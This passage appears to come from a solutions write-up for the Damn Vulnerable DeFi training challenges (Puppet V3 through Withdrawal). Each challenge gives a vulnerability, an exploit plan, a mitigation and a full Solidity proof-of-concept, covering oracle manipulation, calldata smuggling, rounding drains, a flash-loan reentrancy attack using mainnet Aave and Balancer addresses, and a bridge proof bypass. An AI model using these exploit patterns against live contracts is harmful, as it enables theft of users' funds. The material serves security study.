- Sell the player's 110 DVT into the Uniswap V3 pool with `exactInputSingle` to crash the price, then `vm.warp` forward 114 seconds (just under the limit) so the TWAP moves toward the crashed price. `calculateDepositOfWETHRequired` is now cheap enough to borrow all 1M DVT with the player's WETH and send it to recovery.
### mitigation :
- Use a longer TWAP window or a second oracle so a short, single-block price push can't move the average enough to cheat the collateral quote.
### POC
```solidity
function test_puppetV3() public checkSolvedByPlayer {
    address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    token.approve(address(uniswapRouterAddress), type(uint256).max);
    uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    console.log("quote1: ", quote1);

    ISwapRouter(uniswapRouterAddress).exactInputSingle(
        ISwapRouter.ExactInputSingleParams(
            address(token),
            address(weth),
            3000,
            address(player),
            block.timestamp,
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            0
        )
    );
    vm.warp(block.timestamp + 114);
    uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    weth.approve(address(lendingPool), quote);
    console.log("quote: ", quote);
    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
}
```

## 15. ABI Smuggling
A permissioned vault where each caller may only run certain function selectors via `execute`, vulnerable to calldata smuggling.
### objective(s) :
- Rescue all 1M DVT from the vault to recovery.
### vulnerability :
- `execute()` checks permissions using the selector read from a hardcoded calldata position (byte 100) not from where the `actionData` offset actually points. So the checked selector and the executed call can be different.
### exploit :
- Build calldata by hand, put the `withdraw` selector (which the player is allowed to call) at byte 100 as a decoy, and set the `actionData` offset to point further along to a `sweepFunds(recovery, token)` call (which the player is not allowed to call). The check passes on the decoy but the vault runs `sweepFunds`.
### mitigation :
- Decode `actionData` exactly as it will be executed and check the selector of that real payload. never read the permission selector from a hardcoded calldata offset.
### POC
```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    Exploit exploit = new Exploit(address(vault), address(token), recovery);
    bytes memory payload = exploit.executeExploit();
    address(vault).call(payload);
}

contract Exploit {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public player;
    address public recovery;

    constructor(address _vault, address _token, address _recovery) {
        vault = SelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = msg.sender;
    }

    function executeExploit() external returns (bytes memory) {

        // `execute()` function selector
        bytes4 executeSelector = vault.execute.selector;

        // Construct the target contract address, which is the vault address, padded to 32 bytes
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));

        // Construct the calldata start location offset
        bytes memory dataOffset = abi.encodePacked(uint256(0x80)); // Offset for the start of the action data

        // Construct the empty data filler (32 bytes of zeros)
        bytes memory emptyData = abi.encodePacked(uint256(0));

        // Manually define the `withdraw()` function selector as `d9caed12` followed by zeros
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),     // Withdraw function selector
            bytes28(0)              // 28 zero bytes to fill the 32-byte slot
        );

        // Construct the calldata for the `sweepFunds()` function
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        // Manually set actionDataLength to 0x44 (68 bytes)
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));


        // Combine all parts to create the complete calldata payload
        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,              // 4 bytes
            target,                       // 32 bytes
            dataOffset,                   // 32 bytes
            emptyData,                    // 32 bytes
            withdrawSelectorPadded,       // 32 bytes (starts at the 100th byte)
            actionDataLength,             // Length of actionData
            sweepFundsCalldata            // The actual calldata to `sweepFunds()`
        );


        // Return the constructed calldata payload
        return calldataPayload;
    }
}
```

## 16. Shards
An NFT fractional marketplace that sells NFT shards for DVT, vulnerable to inconsistent rounding between pay and refund.
### objective(s) :
- Take DVT out of the marketplace (more than 0.01% of it) and send all of it to recovery.
### constraint(s) :
- The staking contract's balance must not change.
- Use only 1 transaction.
### vulnerability :
- `fill()` charges `want * _toDVT(price, rate) / totalShards` rounded down so buying 100 shards costs 0 DVT (100 * 75e21 / 1e25 = 0.75 → 0).
- `cancel()` refunds with a different formula `shards * rate / 1e6`, rounded up, which pays back ~7.5e12 DVT wei for the same 100 shards.
- `cancel()`'s time check is written backwards so you can cancel in the same block as the purchase.
### exploit :
- Loop fill 100 shards and cancel 10001 times inside one exploit contract (to keep it to 1 transaction) then send the profit to recovery.
### mitigation :
- Use consistent rounding that always favors the protocol (round the charge up, refund down), reject zero-cost fills, and fix the reversed time-window comparison in `cancel()`.
### POC
```solidity
 function test_shards() public checkSolvedByPlayer {
         Exploit exploit = new Exploit(marketplace,token,recovery);
        exploit.attack(1);
        console.log("recovery balance",token.balanceOf(address(recovery)));
    }

contract Exploit {
    ShardsNFTMarketplace public marketplace;
    DamnValuableToken public token;
    address recovery;

    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
        marketplace = _marketplace;
        token = _token;
        recovery = _recovery;
    }

    function attack(uint64 offerId) external {
        uint256 wantShards = 100; // Fill 100 shards per call

        // Loop 10001 times to execute fill(1, 100)
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1,i);
        }

        token.transfer(recovery,token.balanceOf(address(this)));
    }
}
```

## 17. Curvy Puppet
A lending contract that lets users borrow Curve stETH/ETH LP tokens against DVT, vulnerable to read-only reentrancy on Curve's `get_virtual_price()`.
### objective(s) :
- Close all 3 users' positions (alice/bob/charlie) in the lending contract (collateral and borrow both 0).
### constraint(s) :
- The treasury must keep some WETH and some LP and end with all 3 users' DVT.
- The player must end with nothing.
### vulnerability :
- The lending contract prices its borrow asset (the Curve stETH/ETH LP token) as `ETH_price * get_virtual_price()`. The old Curve pool's `remove_liquidity` burns LP supply first then raw-calls the caller with ETH **before** the pool balances settle, so `get_virtual_price()` reads an inflated value during that ETH callback (re-entering a view function while the contract's state is half-updated).
- Because the LP token is the users' borrow asset, an inflated LP price inflates everyone's debt value, flipping the 3 overcollateralized positions to liquidatable.
- Liquidation triggers when `collateralValue*100 < borrowValue*175`. With collateral = 2500 DVT at $10 and borrow = 1 LP (25000 * 100 < 4000 * vp * 175) this needs `virtual_price > 3.5714e18`. 
### exploit :
- Nested flash loan (Balancer outer, Aave inner) for WETH+wstETH. Unwrap to ETH+stETH, then call `add_liquidity` stETH-heavy. Calling `remove_liquidity` triggers read-only reentrancy, spiking virtual_price. During that callback, call `liquidate()` on all 3 users (1 LP in, 2500 DVT out each).
- Repay by convert the ETH surplus to stETH (Lido) and wrap to wstETH to cover the Aave+Balancer debt. Aave's ~0.05% premium is absorbed by the treasury's WETH cushion.
### mitigation :
- Never read `get_virtual_price()` (or any pool state) while control can be handed to an untrusted caller. use a manipulation-resistant oracle or guard views with the pool's reentrancy lock. Don't price a lending asset off a single spot virtual price.
### POC
```solidity
  function test_curvyPuppet() public checkSolvedByPlayer {
        // Move the treasury's offered capital into the exploit contract.
        //treasury approved `player` in setUp, and we run as player
        Exploit exploit = new Exploit(
            lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
        );
        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);

        // Kick off the flash-loan, add_liquidity, remove_liquidity(reentrancy) then liquidate flow.
        exploit.run();
    }

// from `https://github.com/balancer/balancer-v2-monorepo/blob/master/pkg/interfaces/contracts/vault/IVault.sol`
interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

//from `https://github.com/lidofinance/core/blob/master/contracts/0.6.12/WstETH.sol`
interface IWstETH {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Exploit {
    //mainnet addresses
    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; // Aave V3 Pool
    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    // flash-loan amounts (each must stay <= that lender's holdings)
    // Balancer holdings at the block are ~37,991 WETH, ~12,597 wstETH
    uint256 constant BAL_WETH   = 37_000e18;
    uint256 constant BAL_WSTETH = 12_000e18;
    // Aave holdings at the block are ~83,192 WETH, ~1,036,780 wstETH
    // The reentrancy spike (virtual_price) scales with the stETH side, so we deposit
    // MORE stETH than ETH. wstETH is sized to push virtual_price just past the
    // liquidation threshold (~3.5714e18). A bigger wstETH loan means a bigger Aave fee
    // which means less treasury cushion survives.
    uint256 constant AAVE_WETH   = 83_000e18;
    uint256 constant AAVE_WSTETH = 140_000e18;
    // ETH kept back (not converted to stETH) so the treasury ends with WETH > 0.
    uint256 constant ETH_RESERVE = 20e18;

    CurvyPuppetLending immutable lending;
    IStableSwap immutable curvePool;
    CurvyPuppetOracle immutable oracle;
    DamnValuableToken immutable dvt;
    IERC20 immutable stETH;
    WETH immutable weth;
    address immutable treasury;
    address immutable lpToken;
    address[3] users;

    // a flag that checks whether we're currently inside the liquidation window so receive() knows when it's safe to call liquidate().
    enum State { NONE, LIQUIDATING }
    State state;

    constructor(
        CurvyPuppetLending _lending,
        IStableSwap _curvePool,
        CurvyPuppetOracle _oracle,
        DamnValuableToken _dvt,
        IERC20 _stETH,
        WETH _weth,
        address _treasury,
        address[3] memory _users
    ) {
        lending = _lending;
        curvePool = _curvePool;
        oracle = _oracle;
        dvt = _dvt;
        stETH = _stETH;
        weth = _weth;
        treasury = _treasury;
        users = _users;
        lpToken = _curvePool.lp_token();
    }

    function run() external {
        // OUTER loan (called first and repaid last). Balancer (no fee).
        // requires tokens sorted ascending by address: wstETH (0x7f39..) < WETH (0xC02a..)
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = address(wstETH);
        tokens[1] = address(weth);
        amounts[0] = BAL_WSTETH;
        amounts[1] = BAL_WETH;
        balancer.flashLoan(address(this), tokens, amounts, "");

        // transfer assets to treasury
        weth.deposit{value: address(this).balance}();                                 
        dvt.transfer(treasury, dvt.balanceOf(address(this)));                          
        weth.transfer(treasury, weth.balanceOf(address(this)));                        
        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this)));  
    }

    // Balancer call back. sent us BAL_WETH + BAL_WSTETH. Nest the Aave loan inside.
    function receiveFlashLoan(
        address[] memory, //tokens
        uint256[] memory, //amounts
        uint256[] memory, //fees (0)
        bytes memory //userData
    ) external {
        require(msg.sender == address(balancer), "not balancer");

        // INNER loan (Aave) its callback (executeOperation) runs the attack.
        address[] memory assets = new address[](2);
        uint256[] memory amts = new uint256[](2);
        uint256[] memory modes = new uint256[](2); // [0,0] = no debt opened, repay in full
        assets[0] = address(weth);
        assets[1] = address(wstETH);
        amts[0] = AAVE_WETH;
        amts[1] = AAVE_WSTETH;
        (bool ok,) = aavePool.call(
            abi.encodeWithSignature(
                "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
                address(this), assets, amts, modes, address(this), bytes(""), uint16(0)
            )
        );
        require(ok, "aave flashloan failed");

        // Back from Aave. repay Balancer.
        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
    }

    // INNER callback. now holding Balancer + Aave tokens combined. Do everything here.
    function executeOperation(
        address[] calldata, //assets
        uint256[] calldata, //amounts
        uint256[] calldata fees,
        address initiator,
        bytes calldata 
    ) external returns (bool) {
        require(msg.sender == aavePool, "not aave");
        require(initiator == address(this), "bad initiator");

        // 1) turn ALL borrowed tokens into pool assets (ETH + stETH)
        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));   // all WETH to ETH
        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this))); // all wstETH to stETH
        stETH.approve(address(curvePool), type(uint256).max);

        // 2) add the combined oversized liquidity deposit: coin0 = ETH, coin1 = stETH
        uint256 stEthAmount = stETH.balanceOf(address(this));
        uint256 ethForLp = address(this).balance;
        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);

        // 3) let the lending contract pull our LP (borrowAsset) during liquidate()
        IERC20(lpToken).approve(address(permit2), type(uint256).max);
        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));

        // 4) Remove liquidity. This makes the pool send us ETH directly, which triggers our receive() function, and that's where we liquidate.
        state = State.LIQUIDATING;
        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
        state = State.NONE;

        // 5) Repay. After removal + liquidations we hold ETH (surplus) + stETH.
        //    We deposited mostly stETH and got back mostly ETH, so now we have
        //    extra ETH but are short on wstETH, and the two amounts are worth
        //    roughly the same. So we convert the extra ETH into stETH and wrap
        //    it into wstETH to cover what we owe.
        uint256 wethOwed   = AAVE_WETH + fees[0] + BAL_WETH;      
        uint256 wstethOwed = AAVE_WSTETH + fees[1] + BAL_WSTETH;  

        // First set aside exactly the WETH we owe.
        weth.deposit{value: wethOwed}();                              // ETH to WETH

        // Convert remaining ETH into stETH (keep ETH_RESERVE so treasury ends with WETH > 0).
        uint256 ethBal = address(this).balance;
        if (ethBal > ETH_RESERVE) {
            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
                abi.encodeWithSignature("submit(address)", address(0))
            );
            require(ok, "lido submit failed");
        }

        // Wrap all stETH to wstETH. must cover everything we owe.
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(stETH.balanceOf(address(this)));
        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");

        // Aave pulls its owed amounts via transferFrom when we return true.
        IERC20(address(weth)).approve(aavePool, AAVE_WETH + fees[0]);
        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + fees[1]);
        return true;
    }

    // Curve pool sends ETH here during remove_liquidity (read-only reentrancy window)
    receive() external payable {
        if (state != State.LIQUIDATING) return;
        // virtual_price is inflated right now so every borrow position is liquidatable
        for (uint256 i = 0; i < users.length; i++) {
            lending.liquidate(users[i]);
        }
    }
}
```

## 18. Withdrawal
An L2 to L1 token bridge whose gateway finalizes withdrawals from Merkle-proven L2 logs, vulnerable to operator proof bypass and ignored call failures.
### objective(s) :
- Finalize all 4 withdrawals in the given set in `withdrawals.json`(including the suspicious one) in the L1 gateway.
### constraint(s) :
- The token bridge must lose some funds, but less than 1%.
- The player must end with 0 tokens.
### vulnerability :
- `L1Gateway.finalizeWithdrawal()` lets anyone with `OPERATOR_ROLE` (the player) finalize a withdrawal with an **empty Merkle proof**.
- It marks the leaf finalized + increments the counter **before** the external call, then ignores whether that call succeeds. So a withdrawal can be "finalized" while its token transfer fails.
- Among the 4 logged withdrawals, three are legit 10-DVT transfers and one (index 2) is malicious, pulling 999,000 DVT and draining the bridge.
### exploit :
- `vm.warp` past the 7 day delay Then, as operator, replaying the exact payloads from `withdrawals.json`:
  1. Finalize the 3 legit withdrawals.
  2. Finalize the crafted withdrawal that pulls 999,000 DVT out to the player, emptying the bridge.
  3. Finalize the malicious withdrawal. `TokenBridge.executeTokenWithdrawal` does `totalDeposits -= 999_000e18` which underflows and reverts, so the leaf is recorded but 0 tokens move.
  4. Transfer the 999,000 DVT back to the bridge (player ends with 0).
### mitigation :
- Don't let a privileged role bypass proof verification, verify the message actually executed successfully before marking it finalized (check the call's return value / revert), and add a per-withdrawal amount cap so a single message can never drain the bridge.
### POC
```solidity
function test_withdrawal() public checkSolvedByPlayer {
    // the player = OPERATOR_ROLE so can skip merkle proof verification and just warp 7 day delay.
    vm.warp(block.timestamp + l1Gateway.DELAY() + 1 days);

    bytes32[] memory noProof = new bytes32[](0);
    string memory logs = vm.readFile("test/withdrawal/withdrawals.json");

    // 1) Finalize the 3 legitimate withdrawals (indexes 0,1,3), 10 DVT each.
    // Log layout: topics[1]=nonce, topics[2]=l2Sender(L2Handler), topics[3]=target(L1Forwarder),
    //             data=abi.encode(bytes32 id, uint256 timestamp, bytes message).
    uint256[3] memory legit = [uint256(0), 1, 3];
    for (uint256 j = 0; j < legit.length; j++) {
        (, uint256 timestamp, bytes memory message) = abi.decode(
            vm.parseJsonBytes(logs, string.concat("[", vm.toString(legit[j]), "].data")),
            (bytes32, uint256, bytes)
        );
        l1Gateway.finalizeWithdrawal(
            uint256(vm.parseJsonBytes32(logs, string.concat("[", vm.toString(legit[j]), "].topics[1]"))),
            l2Handler,
            address(l1Forwarder),
            timestamp,
            message,
            noProof
        );
    }

    // 2) The malicious withdrawal (index 2) pulls 999,000 DVT and would drain the bridge.
    //        so we first move the bridge's funds out of reach via our own crafted withdrawal
    //        making `totalDeposits -= 999_000e18` underflows and reverts.
    //        finalizeWithdrawal records the leaf before the call and ignores its success so it is still finalized.
    uint256 drain = 999_000e18;
    bytes memory inner = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", player, drain);
    bytes memory fwd = abi.encodeWithSignature(
        "forwardMessage(uint256,address,address,bytes)", uint256(1000), player, address(l1TokenBridge), inner
    );
    // l2Sender = l2Handler so L1Forwarder's xSender check passes.
    l1Gateway.finalizeWithdrawal(1000, l2Handler, address(l1Forwarder), START_TIMESTAMP, fwd, noProof);

    // 3) Finalize the malicious withdrawal (index 2). its inner transfer now fails (underflow) so it is marked finalized but moves 0 tokens.
    {
        (, uint256 timestamp, bytes memory message) =
            abi.decode(vm.parseJsonBytes(logs, "[2].data"), (bytes32, uint256, bytes));
        l1Gateway.finalizeWithdrawal(
            uint256(vm.parseJsonBytes32(logs, "[2].topics[1]")),
            l2Handler,
            address(l1Forwarder),
            timestamp,
            message,
            noProof
        );
    }

    // 4) Return the temporarily-drained tokens to the bridge (player ends with 0).
    token.transfer(address(l1TokenBridge), drain);
}
```
